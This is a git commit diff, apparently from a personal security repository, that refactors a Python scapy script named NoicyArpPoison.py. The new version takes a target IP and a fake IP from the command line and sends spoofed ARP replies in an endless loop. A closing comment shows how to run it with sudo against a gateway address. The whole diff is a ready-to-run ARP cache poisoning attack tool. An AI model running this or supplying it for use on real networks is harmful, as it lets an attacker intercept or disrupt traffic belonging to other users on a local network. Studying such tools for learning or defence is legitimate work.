40a1f55a564594300a1615201313cbefa2330e37
LarsRosenkilde <50791042+LarsRosenkilde@users.noreply.github.com>
2022-08-19 12:09:26 +0200

    Add files via upload

--- ARP-Cache-Poisoning/NoicyArpPoison.py
+++ ARP-Cache-Poisoning/NoicyArpPoison.py
@@ -4,31 +4,26 @@ import sys, time
 from scapy.all import sendp, ARP, Ether
 
 
-class NoicyArpPoison(object):
-    def __init__(self):
-        self.interface = "eth0"
-        self.target_ip = "localhost"   # sys.argv[1]
-        self.fake_ip   = "192.168.0.5" # sys.argv[2]
+if len(sys.argv) < 3:
+    print(f"{sys.argv[0]}: <target_ip> <fake_ip>")
+    sys.exit(1)
 
-        self.ehernet = Ether()
+interface = "eth0"
+target_ip = sys.argv[1]
+fake_ip   = sys.argv[2]
+
+ehernet = Ether()
 
     
-    def run(self):
-        if len(sys.argv) < 3:
-            print(f"{sys.argv[0]}: {self.target_ip} {self.fake_ip}")
-            sys.exit(1)
-        
-        arp = ARP(pdst=self.target_ip,
-                  psrc=self.fake_ip,
-                  op="is-at")
+arp = ARP(pdst=target_ip,
+          psrc=fake_ip,
+          op="is-at")
 
-        packet = self.ehernet / arp
+packet = ehernet / arp
 
-        while True:
-            sendp(packet, iface=attack.interface)
-            time.sleep(10)    
+while True:
+    sendp(packet, iface=interface)
+    time.sleep(10)    
 
 
-if __name__ == "__main__":
-    attack = NoicyArpPoison()
-    attack.run()
+# sudo python NoicyArpPoison.py 192.168.0.1 192.168.0.6
